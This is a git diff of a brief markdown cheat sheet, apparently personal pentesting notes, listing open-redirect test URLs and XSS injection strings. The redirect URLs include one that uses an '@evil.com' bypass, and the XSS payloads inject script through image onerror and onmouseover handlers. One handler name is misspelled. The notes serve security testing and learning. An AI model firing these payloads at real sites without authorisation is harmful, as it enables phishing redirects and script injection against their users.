@@ -1,7 +1,7 @@
 # Open redirect
 
-__`https://test.com/?redirect=https://www.google.com`__
-__`https://test.com/?redirect=https://www.google.com@evil.com`__
+- __`https://test.com/?redirect=https://www.google.com`__
+- __`https://test.com/?redirect=https://www.google.com@evil.com`__
 
 
 # Cross-Site Scripting (XSS)
@@ -9,5 +9,5 @@ __`https://test.com/?redirect=https://www.google.com@evil.com`__
 - __`"><image src=x onerror=alert()>`__
 - __`"><image src=x onmouseover=alert()>`__
 - __`"><image src=x onmouseovr=document.write(1)>`__
-- > __If you are not getting /?id= in url you can use burpsuite__
-  - ![image1]()
+- > __If you are not getting /?name=test123 in url you can use burpsuite__
+  - ![image1](https://github.com/Chittu13/All_in_one/blob/main/image/image1.png)
